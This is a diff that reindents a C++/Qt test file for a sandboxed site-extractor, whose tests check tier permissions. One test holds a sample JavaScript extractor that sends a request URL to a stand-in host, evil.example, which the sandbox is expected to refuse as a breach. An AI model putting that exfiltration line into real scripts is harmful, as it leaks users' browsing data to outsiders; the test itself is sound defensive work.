@@ -37,9 +37,9 @@ static QList<evidence_request> sample() {
 // A master playlist that refers to a variant nobody has requested yet — the
 // case the tier exists for.
 static const char *k_master =
-	"#EXTM3U\n"
-	"#EXT-X-STREAM-INF:BANDWIDTH=637387,RESOLUTION=406x720\n"
-	"index-f1-v1-a1.txt?k=UCp\n";
+  "#EXTM3U\n"
+  "#EXT-X-STREAM-INF:BANDWIDTH=637387,RESOLUTION=406x720\n"
+  "index-f1-v1-a1.txt?k=UCp\n";
 
 int main(int argc, char **argv) {
 	std::setvbuf(stdout, nullptr, _IONBF, 0);
@@ -221,8 +221,8 @@ int main(int argc, char **argv) {
 		a.observe(sample());
 		helper_host h(&a, fake, helper_budget{});
 		const extractor_verdict v =
-			site_extractor::check(src, QUrl("https://site.example/watch/1"),
-			                       sample(), &h);
+		  site_extractor::check(src, QUrl("https://site.example/watch/1"),
+		                         sample(), &h);
 		check(v.usable, QString("it is accepted (%1)").arg(v.message));
 		check(v.result.url.toString().contains("index-f1"),
 		      "and the answer is the variant, which the page never requested");
@@ -234,16 +234,16 @@ int main(int argc, char **argv) {
 	section("a script that reaches past what it was given");
 	{
 		const QString src =
-			"extract = function (page, requests) {"
-			"  var stolen = hydra.text('https://evil.example/?d=' + requests[0].url);"
-			"  return { url: requests[0].url, kind: 'direct' };"
-			"};";
+		  "extract = function (page, requests) {"
+		  "  var stolen = hydra.text('https://evil.example/?d=' + requests[0].url);"
+		  "  return { url: requests[0].url, kind: 'direct' };"
+		  "};";
 		helper_allowlist a;
 		a.observe(sample());
 		helper_host h(&a, fake, helper_budget{});
 		const extractor_verdict v =
-			site_extractor::check(src, QUrl("https://site.example/watch/1"),
-			                       sample(), &h);
+		  site_extractor::check(src, QUrl("https://site.example/watch/1"),
+		                         sample(), &h);
 		check(!v.usable, "is refused");
 		check(v.helper_breach,
 		      "as a breach of the tier, not as a wrong answer");
@@ -256,11 +256,11 @@ int main(int argc, char **argv) {
 	section("the pure tier cannot see the surface at all");
 	{
 		const QString src =
-			"extract = function (page, requests) {"
-			"  return { url: String(typeof hydra), kind: 'direct' };"
-			"};";
+		  "extract = function (page, requests) {"
+		  "  return { url: String(typeof hydra), kind: 'direct' };"
+		  "};";
 		const extraction r = site_extractor::run(
-			src, QUrl("https://site.example/watch/1"), sample());
+		  src, QUrl("https://site.example/watch/1"), sample());
 		check(r.ok && r.url.toString() == "undefined",
 		      "with no helpers supplied, `hydra` is not there to be found");
 	}
